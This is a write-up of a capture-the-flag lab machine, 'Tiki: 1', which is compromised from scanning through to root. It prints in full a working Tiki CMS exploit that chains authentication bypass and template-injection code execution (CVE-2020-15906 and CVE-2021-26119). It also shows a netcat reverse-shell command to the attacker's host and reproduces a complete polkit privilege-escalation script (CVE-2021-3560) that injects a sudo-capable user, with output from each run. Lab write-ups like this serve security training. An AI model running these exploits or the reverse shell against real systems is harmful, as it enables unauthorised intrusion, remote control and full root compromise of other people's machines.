# Tiki: 1 Writeup 

Description
```bash
Oh no our webserver got compromised. The attacker used an 0day, so we dont know how he got into the admin panel. Investigate that.

This is an OSCP Prep Box, its based on a CVE I recently found. Its on the OSCP lab machines level.

If you need hints contact me on Twitter: S1lky_1337, should work on VirtualBox and Vmware.

```
\
# Exploitation
Let's start with network scan 
```bash
Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts   
                                                                        
 1 Captured ARP Req/Rep packets, from 1 hosts.   Total size: 60         
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.108   08:00:27:46:25:33      1      60  PCS Systemtechnik Gmb

```
\
Next, Open Ports
```bash
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```
\
Lets enumerate smb service with smbmap
```bash
smbmap -H 192.168.0.108             

    ________  ___      ___  _______   ___      ___       __         _____
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  __
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______
-------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                         
[*] Established 1 SMB connections(s) and 0 authenticated session(s)      
                                                                         
[+] IP: 192.168.0.108:445       Name: 192.168.0.108             Status: N
        Disk                                                    Permissio
        ----                                                    ---------
        print$                                                  NO ACCESS
        Notes                                                   READ ONLY
        IPC$                                                    NO ACCESS
[*] Closed 1 connections
```
\
We can see read Notes share as anonymous, so lets access that share to view contents
```bash
smbclient //192.168.0.108/Notes -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 29 09:52:09 2020
  ..                                  D        0  Thu Jul 30 15:32:11 2020
  Mail.txt                            N      244  Wed Jul 29 09:52:05 2020

                19992176 blocks of size 1024. 10040104 blocks available
smb: \> get Mail.txt 
getting file \Mail.txt of size 244 as Mail.txt (79.4 KiloBytes/sec)
```
\
We get a file Mail.txt
```bash
cat Mail.txt  
Hi Silky
because of a current Breach we had to change all Passwords,
please note that it was a 0day, we don't know how he made it.

Your new CMS-password is now 51lky571k1, 
please investigate how he made it into our Admin Panel.

Cheers Boss.
```
\
Next , Lets open port 80 on browser , its just a regular apache default page
\
Next, Lets run dirb
```bash
dirb http://192.168.0.108/           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb  5 04:12:19 2026
URL_BASE: http://192.168.0.108/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.108/ ----
+ http://192.168.0.108/index.html (CODE:200|SIZE:10918)                                                                                                                                                                                    
+ http://192.168.0.108/robots.txt (CODE:200|SIZE:42)                                                                                                                                                                                       
+ http://192.168.0.108/server-status (CODE:403|SIZE:278)                                                                                                                                                                                   
==> DIRECTORY: http://192.168.0.108/tiki/
```
\
at /tiki , we see a tiki cms page
\
<img width="1901" height="762" alt="image" src="https://github.com/user-attachments/assets/068bf0da-5ff7-41a5-bbe5-fec7c431b467" />
\
Using , the credentials given in the Mail.txt , i could login 
\
Then i started checking around , on the left side tab , there is a "List pages" section under wiki
\
<img width="302" height="357" alt="image" src="https://github.com/user-attachments/assets/c2d78c2b-5255-4173-9dfd-814f62da1184" />
\
After that , we see these 2 files
\
<img width="1171" height="532" alt="image" src="https://github.com/user-attachments/assets/e55abfbc-5c37-4dec-89a7-607a32b78935" />
\
We click on the wrench symbol beside "Silkys Homepage" and then click "History"
\
and here i select HTML diff , so basically on this page , we can see the difference b/w the versions of the homepage
\
<img width="926" height="704" alt="image" src="https://github.com/user-attachments/assets/0e099052-83c7-4bfc-b7d7-6e37350c28d9" />
\
After chekcing a little bit , i saw this
\
<img width="881" height="386" alt="image" src="https://github.com/user-attachments/assets/350387bf-8f0c-4eaa-8a04-8c7d92c13a19" />
\
Which explicitly mentions about "CVE-2020-159**"  , the last 2 numbers were not specified , so i googled and found that "CVE-2020-15906" is a auth bypass in tiki cms
\
So we get the poc from "https://github.com/vulhub/vulhub/blob/master/tikiwiki/CVE-2020-15906/poc.py"
```bash
import requests
import sys
import re


def auth_bypass(s, t):
    d = {
        "ticket" : "",
        "user" : "admin",
        "pass" : "trololololol",
    }
    h = { "referer" : t }
    d["ticket"] = get_ticket(s, "%stiki-login.php" % t)
    d["pass"] = "" # blank login
    r = s.post("%stiki-login.php" % t, data=d, headers=h)
    r = s.get("%stiki-admin.php" % t)
    assert ("You do not have the permission that is needed" not in r.text), "(-) authentication bypass failed!"

def black_password(s, t):
    uri = "%stiki-login.php" % t
    # setup cookies here
    s.get(uri)
    ticket = get_ticket(s, uri)
    d = {
        'user':'admin', 
        'pass':'trololololol',
    }
    # crafted especially so unsuccessful_logins isn't recorded
    for i in range(0, 51):
        r = s.post(uri, d)
        if("Account requires administrator approval." in r.text):
            print("(+) admin password blanked!")
            return
    raise Exception("(-) auth bypass failed!") 

def get_ticket(s, uri):
    h = { "referer" : uri }
    r = s.get(uri)
    match = re.search('class="ticket" name="ticket" value="(.*)" \/>', r.text)
    assert match, "(-) csrf ticket leak failed!"
    return match.group(1)

def trigger_or_patch_ssti(s, t, c=None):
    # CVE-2021-26119
    p = { "page": "look" }
    h = { "referer" : t }
    bypass = "startrce{$smarty.template_object->smarty->disableSecurity()->display('string:{shell_exec(\"%s\")}')}endrce" % c
    d = {
        "ticket" : get_ticket(s, "%stiki-admin.php" % t),
        "feature_custom_html_head_content" : bypass if c else '',
        "lm_preference[]": "feature_custom_html_head_content"
    }
    r = s.post("%stiki-admin.php" % t, params=p, data=d, headers=h)
    r = s.get("%stiki-index.php" % t)
    if c != None:
        assert ("startrce" in r.text and "endrce" in r.text), "(-) rce failed!"
        cmdr = r.text.split("startrce")[1].split("endrce")[0]
        print(cmdr.strip())

def main():
    if(len(sys.argv) < 4):
        print("(+) usage: %s <host> <path> <cmd>" % sys.argv[0])
        print("(+) eg: %s 192.168.75.141 / id"% sys.argv[0])
        print("(+) eg: %s 192.168.75.141 /tiki-20.3/ id" % sys.argv[0])
        return
    p = sys.argv[2]
    c = sys.argv[3]
    p = p + "/" if not p.endswith("/") else p
    p = "/" + p if not p.startswith("/") else p
    t = "http://%s%s" % (sys.argv[1], p)
    s = requests.Session()
    print("(+) blanking password...")
    black_password(s, t)
    print("(+) getting a session...")
    auth_bypass(s, t)
    print("(+) auth bypass successful!")
    print("(+) triggering rce...\n")
    # trigger for rce
    trigger_or_patch_ssti(s, t, c)
    # patch so we stay hidden
    trigger_or_patch_ssti(s, t)

if __name__ == '__main__':
    main()
```
\
So i used the poc in this way to get a reverse shell
```bash
 python 1.py 192.168.0.108 /tiki id
/home/kali/cysec/vulnhub/tiki/1.py:39: SyntaxWarning: invalid escape sequence '\/'
  match = re.search('class="ticket" name="ticket" value="(.*)" \/>', r.text)
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                                                                                                                                                                                                            
C:\home\kali\cysec\vulnhub\tiki> python 1.py 192.168.0.108 /tiki 'busybox nc 192.168.0.105 4444 -e /bin/sh'
/home/kali/cysec/vulnhub/tiki/1.py:39: SyntaxWarning: invalid escape sequence '\/'
  match = re.search('class="ticket" name="ticket" value="(.*)" \/>', r.text)
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...

```
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ubuntu~192.168.0.108-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/ubuntu~192.168.0.108-Linux-x86_64/2026_02_05-04_27_22-819.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@ubuntu:/var/www/html/tiki$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
\
So , then i check the machine , i couldnt find any cron jobs or any suid unusual binaries, so i ran linpeas and foudn that it is vulnerable to polkit priv esc
\
So we get a poc from "https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation"
```bash
#!/bin/bash

$USR
$PASS
$TIME
$FORCE

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color
# Argparse
function usage(){
    echo "CVE-2021-3560 Polkit v0.105-26 Linux Privilege Escalation PoC by SecNigma"
    echo ""
    echo "Original research by Kevin Backhouse"
    echo "https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#vulnerability"
    echo ""
    echo "USAGE:"
    echo "./poc.sh"
    echo "Optional Arguments:"
    echo -e "\t-h --help"
    echo -e "\t-u=Enter custom username to insert (OPTIONAL)"
    echo -e "\t-p=Enter custom password to insert (OPTIONAL)"
    echo -e "\t-f=y, To skip vulnerability check and force exploitation. (OPTIONAL)"
    echo -e "\t-t=Enter custom sleep time, instead of automatic detection (OPTIONAL)"
    echo -e "\tFormat to enter time: '-t=.004' or '-t=0.004' if you want to set sleep time as 0.004ms "
    echo -e "Note:"
    echo -e "Equal to symbol (=) after specifying an option is mandatory."
    echo -e "If you don't specify the options, then the script will automatically detect the possible time and"
    echo -e "will try to insert a new user using that time."
    echo -e "Default credentials are 'secnigma:secnigmaftw'"
    echo -e "If the exploit ran successfully, then you can login using 'su - secnigma'"
    echo -e "and you can spawn a bash shell as root using 'sudo bash'"
    printf "${RED}IMPORTANT: THIS IS A TIMING BASED ATTACK. MULTIPLE TRIES ARE USUALLY REQUIRED!!${NC}\n"
    echo -e ""
}


while [ "$1" != "" ]; do
    PARAM=`echo $1 | awk -F= '{print $1}'`
    VALUE=`echo $1 | awk -F= '{print $2}'`
    case $PARAM in
        -h | --help)
            usage
            exit
            ;;
        -u)
            USR=$VALUE
            ;;
        -p)
            PASS=$VALUE
            ;;
        -t)
            TIME=$VALUE
            ;;
        -f)
            FORCE=$VALUE
            ;;
        *)
            echo "ERROR: unknown parameter \"$PARAM\""
            usage
            exit 1
            ;;
    esac
    shift
done





if  [[ $USR ]];then
	username=$(echo $USR)
else
	username="secnigma"
fi
printf "\n"
printf "${BLUE}[!]${NC} Username set as : "$username"\n"
if  [[ $PASS ]];then
	password=$(echo $PASS)
else

	password="secnigmaftw"
fi
# printf "${BLUE}[!]${NC} Password set as: "$password"\n"

if  [[ $TIME ]];then
	printf "${BLUE}[!]${NC} Timing set to : "$TIME"\n"
else

	printf "${BLUE}[!]${NC} No Custom Timing specified.\n"
	printf "${BLUE}[!]${NC} Timing will be detected Automatically\n"
fi

if  [[ $FORCE ]];then
	printf "${BLUE}[!]${NC} Force flag '-f=y' specified.\n"
	printf "${BLUE}[!]${NC} Vulnerability checking is DISABLED!\n"
else

	printf "${BLUE}[!]${NC} Force flag not set.\n"
	printf "${BLUE}[!]${NC} Vulnerability checking is ENABLED!\n"
fi
	

t=""
timing_int=""
uid=""


function check_dist(){
	dist=$(cat /etc/os-release|grep ^ID= | cut -d = -f2 |grep -i 'centos\|rhel\|fedora\|ubuntu\|debian')
	echo $dist

}




function check_installed(){
	name1=$(echo $1)
	d1=$(echo $2)
	if [[  $(echo $d1 | grep -i 'debian\|ubuntu' ) ]]; then
		out=$(dpkg -l  | grep -i $name1|grep -i "query and manipulate user account information\|utilities to configure the GNOME desktop")
		echo $out
	else
		if [[ $(echo $d1 | grep -i 'centos\|rhel\|fedora' ) ]]; then
			out=$(rpm -qa  | grep -i $name1|grep -i "gnome-control-center\|accountsservice")
			echo $out
		fi
	fi
}

function check_polkit(){
	d=$(echo $1)
	if [[ $(echo $d|grep -i 'debian\|ubuntu') ]]; then
		out=$(dpkg -l | grep -i polkit|grep -i "0.105-26")
	else
		if [[ $(echo $d|grep -i 'centos\|rhel\|fedora') ]];then
			out=$(rpm -qa | grep -i polkit|grep -i '0.11[3-9]')
		fi
	fi
	echo $out
}

function float_to_int(){ 
	floating=$(echo $1)
	temp_val=$(echo ${floating:2:$((${#floating}))}) # Remove point
	echo "`expr $temp_val / 1`"
}

function inc_float(){
	floating=$(echo $1)
	int_val=$(float_to_int $floating)
	val=$(echo $floating | sed -e 's/'`echo $int_val`'/'`expr $int_val + 1`'/g')
	echo $val
}

function dec_float(){
	floating=$(echo $1)
	int_val=$(float_to_int $floating)
	val=$(echo $floating | sed -e 's/'`echo $int_val`'/'`expr $int_val - 1`'/g')
	echo $val
}

function fetch_timing(){
exec 3>&1 4>&2 # Extra file descriptors to catch error
out=$( { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:`echo $username` string:"`echo $username`" int32:1 2>&1 >/dev/null 2>&4 1>&3; } 2>&1 )
tmp=$(echo $out |grep -i "real"|awk -F '.' '{print $2}')
tmp_timing=$(echo ${tmp:0:$((${#tmp}-10))})
exec 3>&- 4>&- # release the extra file descriptors
echo $tmp_timing  
}
    
function calculate_timing(){ 
tmp_timing=$(echo $1)
size_tmp_timing=(echo ${#tmp_timing})

t=$(awk "BEGIN {print `echo $tmp_timing/2`}")
echo $t
exit 
size_t=$(echo ${#t})
if [[ "size_t" -gt "size_tmp_timing" ]] ; then
	t=${t%?}
else
	if [[ "size_t" -lt "size_tmp_timing" ]] ; then
		t=$(awk "BEGIN {print `echo $tmp_timing/2`}") 
	fi
fi
echo $t
}



function insert_user(){
	# Time required to finish the whole dbus-send request
	time_fetched=$(fetch_timing) 
	
	# Time to sleep
	timing=$(calculate_timing `echo "0."$time_fetched`)
	
	temp_count=$(inc_float `echo $timing`)
	count=$(float_to_int $temp_count)
	
	if [[ $TIME ]]; then
		t=""
		t=$(echo $TIME)
	else
		t=""
		t=$(echo $timing)
	fi
	if [[ $(id `echo $username` 2>/dev/null) ]]; then
		uid=$(id `echo $username`|cut -d = -f2|cut -d \( -f1)
		echo $uid","$t 	
	else

	loop_count=20
	for i in $(seq 1  $loop_count|sort -r)
	do
		if [[ $(id `echo $username` 2>/dev/null) ]];
		then
		       uid=$(id `echo $username`|cut -d = -f2|cut -d \( -f1)
			echo $uid","$t
		else
			dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:`echo $username` string:"`echo $username`" int32:1 2>/dev/null & sleep `echo $t`s 2>/dev/null; kill $! 2>/dev/null 
		fi
	

	done
fi

}



function insert_pass(){
	ti=$(echo $1)
	u_id=$(echo $2)
	hash1=$(openssl passwd -5 `echo -n $password`)
	temp_count=$(inc_float `echo $ti`)
	count=$(float_to_int $temp_count)
	time=$(echo $ti)
	loop_count=20
	for i in $(seq 1 $loop_count|sort -r)
	do
		dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User`echo $u_id` org.freedesktop.Accounts.User.SetPassword string:`echo -n $hash1` string:GoldenEye 2>/dev/null & sleep `echo $ti`s 2>/dev/null; kill $! 2>/dev/null
done
return 1

}

function exploit(){
			printf "${BLUE}[!]${NC} Starting exploit...\n"
			printf "${BLUE}[!]${NC} Inserting Username `echo $username`...\n"

			ret=$(insert_user)
			t=$(echo $ret|cut -d , -f2)
			uid=$(echo $ret|cut -d , -f1)

			if [[ $(id `echo $username` |grep -i `echo $username`)  ]]; then
				printf "${GREEN}[+]${NC} Inserted Username `echo $username`  with UID `echo $uid`!\n"
				printf "${BLUE}[!]${NC} Inserting password hash..."
				echo $timing
				ret=$(insert_pass $(echo $t) $(echo $uid))
				if [[ "$ret" -ne "1" ]]; then
					printf "${BLUE}[!]${NC} It looks like the password insertion was succesful!\n"
					printf "${BLUE}[!]${NC} Try to login as the injected user using su - `echo $username`\n"
					printf "${BLUE}[!]${NC} When prompted for password, enter your password \n"
					printf "${BLUE}[!]${NC} If the username is inserted, but the login fails; try running the exploit again.\n"
					printf "${BLUE}[!]${NC} If the login was succesful,simply enter 'sudo bash' and drop into a root shell!\n"
				else
					printf "${BLUE}[!]${NC} It seems like the password injection FAILED!\n"
					printf "${BLUE}[!]${NC} Aborting Execution!\n"
					printf "${BLUE}[!]${NC} Usually multiple attempts are required to get the timing right. Try running the exploit again.\n"
					printf "${BLUE}[!]${NC} If the exploit doesn't work after several tries, then you may have to exploit this manually.\n"
					
				fi
					
					
			else
				printf "${RED}[x]${NC} Insertion of Username failed!\n"
				printf "${BLUE}[!]${NC} Aborting Execution!\n"
				printf "${BLUE}[!]${NC} Usually multiple attempts are required to get the timing right. Try running the exploit again.\n"
				printf "${BLUE}[!]${NC} If the exploit doesn't work after several tries, then you may have to exploit this manually.\n"
			fi 

}

if [[ "$FORCE" == "y" ]]; then 
	exploit

else
	printf "${BLUE}[!]${NC} Starting Vulnerability Checks...\n"
	printf "${BLUE}[!]${NC} Checking distribution...\n"
	dist=$(check_dist)
	printf "${BLUE}[!]${NC} Detected Linux distribution as `echo $dist`\n"

	printf "${BLUE}[!]${NC} Checking if Accountsservice and Gnome-Control-Center is installed\n"
	ac_service=$(check_installed $(echo "accountsservice") $dist)
	gc_center=$(check_installed $(echo "gnome-control-center") $dist)


	if [[ $ac_service && $gc_center ]]
	then
		printf "${GREEN}[+]${NC} Accounts service and Gnome-Control-Center Installation Found!!\n"
		printf "${BLUE}[!]${NC} Checking if polkit version is vulnerable\n"
		polkit=$(check_polkit $(echo $dist))
		if [[ $polkit ]]
		then
			printf "${GREEN}[+]${NC} Polkit version appears to be vulnerable!!\n"
			exploit
		else
			printf "${RED}[x]${NC} ERROR: Polkit version does not appears to be vulnerable!!\n"
			printf "${BLUE}[!]${NC}  Aborting Execution!"
			printf "${BLUE}[!]${NC} You might want to use the '-f=y' flag to force exploit\n"
		fi


		
	else
		printf "${RED}[x]${NC} ERROR: Accounts service and Gnome-Control-Center NOT found!!\n"
		printf "${BLUE}[!]${NC}  Aborting Execution!\n"
	fi
fi
```
After copy it onto our machine , we run it 
```bash
www-data@ubuntu:/tmp$ ./1.sh 

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as ubuntu
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1001!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
```
\
So , now a new user "secnigma" has been created with all sudo priviledges , so based on the Readme Usage of the github 
```bash
USAGE:
     ./poc.sh
     -h --help
     -u=Enter custom username to insert (OPTIONAL)
     -p=Enter custom password to insert (OPTIONAL)
     -f=y, To skip vulnerability check and force exploitation. (OPTIONAL)
     -t=Enter custom sleep time, instead of automatic detection (OPTIONAL)
     Format to enter time: '-t=.004' or '-t=0.004' if you want to set sleep time as 0.004ms 
Note:
Equal to symbol (=) after specifying an option is mandatory.
If you donot specify the options, then the script will automatically detect the possible time and
will try to insert a new user using that time.
Default credentials are 'secnigma:secnigmaftw'
If the exploit ran successfully, then you can login using 'su - secnigma'
and you can spawn a bash shell as root using 'sudo bash'
```
\
WE have to now switch over to the user "secnigma" with the password "secnigmaftw"
```bash
www-data@ubuntu:/tmp$ su secnigma
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

secnigma@ubuntu:/tmp$ id
uid=1001(secnigma) gid=1001(secnigma) Gruppen=1001(secnigma),27(sudo)
secnigma@ubuntu:/tmp$ sudo -l
[sudo] Passwort für secnigma: 
Passende Defaults-Einträge für secnigma auf ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

Der Benutzer secnigma darf die folgenden Befehle auf ubuntu ausführen:
    (ALL : ALL) ALL
secnigma@ubuntu:/tmp$ sudo su 
root@ubuntu:/tmp# cd /root
root@ubuntu:~# ls -la
insgesamt 44
drwx------  5 root root 4096 Jul 30  2020 .
drwxr-xr-x 20 root root 4096 Jul 28  2020 ..
-rw-------  1 root root 2123 Jul 31  2020 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Apr 23  2020 .cache
-rw-r--r--  1 root root 2247 Jul 30  2020 flag.txt
drwxr-xr-x  3 root root 4096 Jul 29  2020 .local
-rw-------  1 root root  806 Jul 30  2020 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   66 Jul 30  2020 .selected_editor
drwx------  2 root root 4096 Jul 30  2020 .ssh
root@ubuntu:~# cat flag.txt 

 ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗  █████╗ ████████╗██╗   ██╗██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗██╗
██╔════╝██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██║
██║     ██║   ██║██╔██╗ ██║██║  ███╗██████╔╝███████║   ██║   ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║███████╗██║
██║     ██║   ██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║╚═╝
╚██████╗╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║███████║██╗
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝
                                                                                                                                
You did it ^^
I hope you had fun.
Share your flag with me on Twitter: S1lky_1337


flag:88d8120f434c3b4221937a8cd0668588



```
\
The End , thank you for reading till here
